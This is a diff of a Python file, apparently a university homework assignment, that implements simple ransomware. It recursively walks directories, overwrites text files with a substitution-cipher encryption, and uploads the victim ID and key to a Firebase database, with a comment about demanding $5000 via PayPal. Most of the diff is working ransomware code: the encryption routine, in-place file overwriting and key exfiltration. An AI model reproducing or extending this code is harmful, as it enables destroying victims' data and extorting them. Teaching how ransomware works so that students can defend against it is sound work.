@@ -3,21 +3,7 @@
 #CS377 Homework
 #
 #To run file in linux "python3 encrypt.py"
-#This program will look for all text file within the current directory and encrypt it
-
-
-
-#TO DO LIST:
-#   1.Your Ransomware should be able to infect entire recursive directories on a Linux platform
-#       a. Need to make it recursive to all directories
-#   2.You may make the simplifying assumption that the victim’s computer has only text files, for example
-#   3. Also, assume that your Ransomware somehow finds its way onto the victim’s computer.
-
-#COMPLETED:
-#   1.Start by implementing a not-so-simple substitution crypto algorithm
-#   2.You will need to expand on what we covered in class to cover things like, space, tab, and punctuation.
-#   3.Then, use this algorithm to encrypt the victim’s files
-#   4.For now I have kept space, newline, and tab as is. Will probably need to encrypt it to a symbol or seomthing
+#This program will look for all text file within the current directory and sub-directories and encrypt it
 
 import sys
 import os
@@ -26,15 +12,10 @@ import firebase_admin
 from firebase_admin import credentials
 from firebase_admin import db
 
-
-#Function to check number with its corresponding unicode
-def printchr():
-    for x in range(150):
-        print(x, ":", chr(x))
-
 #Function to encrypt data within text file
+#Depending on the ASCII number, it will shift to the right depending on the ASCII bracket defined on line 30-47
+#
 def encrypt(text, key):
-    #How many shifts in the alphabet
     encryptData = ""
 
     #Open file and read the data in the file char by char
@@ -51,37 +32,36 @@ def encrypt(text, key):
             #Check if char is upper
             elif(character.islower()):
                 encryptData += chr((ord(character) + key - 97) % 26 + 97)
-            elif(33 <= ord(character) <= 64):
-                encryptData += chr((ord(character) + key - 33) % 32 + 33)
-            elif(91 <= ord(character) <= 96):
-                encryptData += chr((ord(character) + key - 91) % 6 + 91)
-            elif(123 <= ord(character) <= 126):
-                encryptData += chr((ord(character) + key - 123) % 4 + 123)
+            #Check if char is space
             elif(character == " "):
-                print("#To do(Space)")
                 encryptData += chr((ord(character)))
+            #Check if char is newline
             elif(character == "\n"):
-                print("#To do(Newline)")
                 encryptData += chr((ord(character)))
+            #Check if char is tab
             elif(character == "\t"):
-                print("#To do(Tab)")
                 encryptData += chr((ord(character)))
+            #ASCII 33-64 (Symbols)
+            elif((ord(character) >= 33 and ord(character) <= 64)):
+                encryptData += chr((ord(character) + key - 33) % 32 + 33)
+            #ASCII 91-96 (Symbols)
+            elif((ord(character) >= 91 and ord(character) <= 96)):
+                encryptData += chr((ord(character) + key - 91) % 6 + 91)
+            #ASCII 123-126 (Symbols)
+            elif((ord(character) >= 123 and ord(character) <= 126)):
+                encryptData += chr((ord(character) + key - 123) % 4 + 123)
+
 
     file.close()
-    print(encryptData)
 
-    print("--------------------------")
+    #Write the encrypted data into the textfile
     encryptFile = open(text, "w")
     encryptFile.write(encryptData)
     encryptFile.close()
 
-
-#printchr()
-'''
-def testEncrypt(path):
-    encrypt(path)
-'''
-
+#sendKeyToDB()
+#Sends the key to the database which can be retrieved if
+#the victim sends $5000 usd to our paypal ;)
 def sendKeyToDB():
     cred = credentials.Certificate('cs377-project-creds.json')
     firebase_admin.initialize_app(cred, {
@@ -100,7 +80,9 @@ def sendKeyToDB():
 
     return victim_id, key
 
-
+#main()
+#Given a path and a key, find all text files and encrypt it
+#Within the current directory and all sub-directories
 def main(path, key):
     file = os.listdir(path)
     if len(file) > 0:
